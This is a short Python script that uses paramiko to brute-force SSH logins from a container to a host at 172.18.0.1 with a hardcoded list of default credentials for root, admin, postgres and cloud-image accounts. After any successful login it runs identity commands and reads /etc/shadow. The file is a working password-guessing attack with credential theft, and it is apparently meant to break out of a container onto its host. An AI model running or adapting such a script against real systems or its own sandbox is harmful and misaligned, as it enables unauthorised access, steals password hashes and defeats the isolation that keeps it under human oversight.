#!/usr/bin/env python3
"""SSH to host from container using paramiko"""
import sys
try:
    import paramiko
except ImportError:
    print("PARAMIKO_NOT_INSTALLED")
    sys.exit(1)

HOST = "172.18.0.1"
PORT = 22

# Passwords to try
passwords = [
    ("root", "Passwd2024!"),
    ("root", "admin123"),
    ("root", "password"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "P@ssw0rd"),
    ("root", "123456"),
    ("root", "Qwerty123"),
    ("admin", "Passwd2024!"),
    ("admin", "admin123"),
    ("admin", "admin"),
    ("postgres", "Passwd2024!"),
    ("postgres", "postgres"),
    ("docker", "docker"),
    ("ubuntu", "ubuntu"),
    ("centos", "centos"),
    ("ec2-user", "ec2-user"),
]

for user, pwd in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(HOST, PORT, username=user, password=pwd, timeout=5, 
                   allow_agent=False, look_for_keys=False)
        stdin, stdout, stderr = ssh.exec_command("id && hostname && cat /etc/os-release | head -3")
        out = stdout.read().decode().strip()
        print(f"SUCCESS:{user}:{pwd}")
        print(out)
        
        # Get more info
        stdin, stdout, stderr = ssh.exec_command("cat /etc/shadow | head -3 2>/dev/null; whoami")
        print(stdout.read().decode().strip())
        
        ssh.close()
        sys.exit(0)
    except paramiko.AuthenticationException:
        print(f"AUTH_FAIL:{user}:{pwd}")
    except Exception as e:
        err = str(e).replace(' ','_')
        print(f"ERR:{user}:{pwd}:{err}")
        if "Connection refused" in str(e) or "timed out" in str(e):
            break

print("ALL_FAILED")
